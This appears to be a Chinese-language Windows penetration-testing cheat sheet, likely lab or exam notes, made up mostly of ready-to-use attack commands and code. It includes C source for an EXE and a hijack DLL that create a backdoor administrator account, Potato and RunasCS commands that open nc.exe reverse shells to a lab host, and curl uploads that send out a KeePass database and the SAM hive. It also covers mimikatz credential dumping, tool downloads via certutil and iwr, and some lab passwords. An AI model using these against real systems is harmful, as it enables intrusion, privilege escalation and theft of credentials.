

## 最应该收集的：

```
- 用户名和主机名
- 当前用户的群组成员身份
- 现有用户和群组
- 操作系统、版本和架构
- 网络信息
- 已安装应用程序
- 正在运行的进程
```



## whoami /priv

https://blog.csdn.net/qq_41874930/article/details/111963586

```
注意SeImpersonatePrivilege
```




## 属于哪些组
```
whoami /groups
```

## 其他用户和组
```
net user
Get-LocalUser cmdlet
```

## 列举现有组
```
net localgroup
Get-LocalGroup
```

## 查看组
```
Get-LocalGroupMember+组名
```

## 操作系统信息收集
```
systeminfo
```

## 网络接口
```
ipconfig /all
```

## 路由表
 ```
route print
 ```

## 网络连接
```
netstat -ano
```

## 枚举已安装应用
```
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
还应检查C:\ 中的 32 位和 64 位 Program Files 目录。
dir 'C:\Program Files'
dir 'C:\Program Files (x86)'
```



## 程序后台运行

```
Start-Process -FilePath ".\iox.exe" -ArgumentList "proxy -r 192.168.251.177:90" -NoNewWindow
```





## 检索开auto服务

```
wmic service get name,displayname,pathname,startmode | findstr /i "auto"
```



## SMB信息收集(一定不要只看enum4linux)

```
enum4linux IP
smbmap -u guest -H IP
smbclient -N -L //IP
smbclient //IP/Data -U 'username'%'password'
```



## 正在运行程序

```
Get-Process
Get-Process -Name 进程名 | Select Path
Get-Process | Select ProcessName, Path
```

## 文件搜索
```
Get-ChildItem -Path C:\ -Include 文件名(可用通配符) -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini,*.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include *.pdf,*.xls,*.xlsx,*.doc,*.docx,*.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include lab.ps1 -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users -Include *.txt -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include .git -File -Recurse -ErrorAction SilentlyContinue
dir C:\.git -Recurse -ErrorAction SilentlyContinue
dir /s /b /ah C:\.git
```

## 不同用户身份运行程序
```
runas /user:backupadministrator cmd
```

## ps历史记录
```
Get-History
(Get-PSReadlineOption).HistorySavePath
```

## 下载文件
```
iwr -Uri http://192.168.45.161/Seatbelt.exe -Outfile Seatbelt.exe
iwr -Uri http://192.168.45.161
/winPEASany.exe -Outfile winPEASany.exe
```

## 重启
```
shutdown /r /t 0
```

## 使用 Get-ModifiableServiceFile显示当前用户可以修改的服务，例如服务二进制文件或配置文件
```
https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
iwr -uri http://192.168.48.3/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Get-ModifiableServiceFile
```

## RDP连接(clipboard启用剪贴板)


```
xfreerdp /u:username /p:'password' /v:192.168.244.221 +clipboard
rdesktop -u username -p 'password' 192.168.244.221

```



## 文件传输

```
iwr -uri http://192.168.45.175/file -Outfile file
certutil -split -urlcache -f http://192.168.45.161/rev.exe C:\\Windows\\Temp\\rev.exe

miniserve -p 80 . -u --
linux
curl -F "path=@C:\Users\milana\Documents\Database.kdbx" http://192.168.45.175/upload?path=/
win
.\curl.exe -F "path=@C:\windows.old\Windows\System32\SAM" http://10.10.62.147:81/upload?path=/

```



## 文件md5

```
windows:
certutil -hashfile file MD5
kali:
md5sum file
```





## 二进制文件劫持

```
powershell -ep bypass
. .\PowerUp.ps1
Get-ModifiableServiceFile
```

### 查询服务

```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

### 查看文件权限

```
icacls "C:\Windows\System32"
```

### 检查服务是否为自启动

```
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
```

### 重启

```
shutdown /r /t 0
```

### 打包添加用户Exe

```
命令：x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user cyb0rg 123@Abc123 /add");
  i = system ("net localgroup administrators cyb0rg /add");
  
  return 0;
}
```

## 修改用户密码

```
net user admin admin123
```



## DLL劫持

### dll编译

```
x86_64-w64-mingw32-gcc dlladduser.cpp --shared -o dlladduser.dll

iwr -uri http://192.168.45.161/fuwujiechi/dlladduser.dll -Outfile dlladduser.dll
move dlladduser.dll 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
```

```
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user cyb0rg 123@Abc123 /add");
  	    i = system ("net localgroup administrators cyb0rg /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

### DLL转移

```
iwr -uri http://192.168.45.161/TextShaping.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
```



## 服务二进制劫持

### 枚举正在运行和已停止的服务

```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
```

### 查看目录权限

```
icacls "C:\Program Files\Windows Media Player"
```

### PS启停应用

```
Start-Service GammaService
Stop-Service GammaService
Restart-Service GammaService
```



## 计划任务

```
Get-ScheduledTask
schtasks /query /fo LIST /v
```

## SigmaPotato

```
.\SigmaPotato.exe "net user cyb0rg 12345 /add"
.\SigmaPotato.exe "net localgroup Administrators cyb0rg /add"
```

## SweetPotato

```
certutil -split -urlcache -f http://192.168.45.175/potato/SweetPotato.exe SweetPotato.exe
.\SweetPotato.exe -t * -p "nc.exe" -a "192.168.45.175 80 -e cmd.exe"
```

## GodPotato

```
certutil -split -urlcache -f http://192.168.45.175/potato/GodPotato-NET4.exe GodPotato-NET4.exe
.\GodPotato-NET4.exe -cmd ".\nc.exe 192.168.45.175 80 -e cmd.exe"
```



## RunasCS

```
.\RunasCS.exe 'damon' 'i6yuT6tym@' '.\nc.exe 192.168.45.175 80 -e powershell.exe'
```





```
xfreerdp /u:cyb0rg /p:'12345' /v:192.168.244.220

xfreerdp /u:moss /p:'work6potence6PLASMA6flint7' /v:192.168.244.221

steve (password securityIsNotAnOption++++++) 
Current.exe

icacls "C:\Users\moss\Searches\"

iwr -uri http://192.168.45.161/potato/SigmaPotato.exe -OutFile 'SigmaPotato.exe'
```



## mimikatz

```
certutil -split -urlcache -f http://192.168.45.175/mimikatz/x64/mimikatz.exe mimikatz.exe

privilege::debug
sekurlsa::logonpasswords
sekurlsa::wdigest
sekurlsa::tickets
```



```
.\mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' 'exit'
.\mimikatz.exe privilege::debug sekurlsa::logonpasswords exit
```







```
icacls "C:\BackupMonitor\BackupMonitor.exe"
iwr -uri http://192.168.45.161/PowerUp.ps1 -Outfile PowerUp.ps1
/PowerUp.ps1


Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'SearchIndexer'}
```







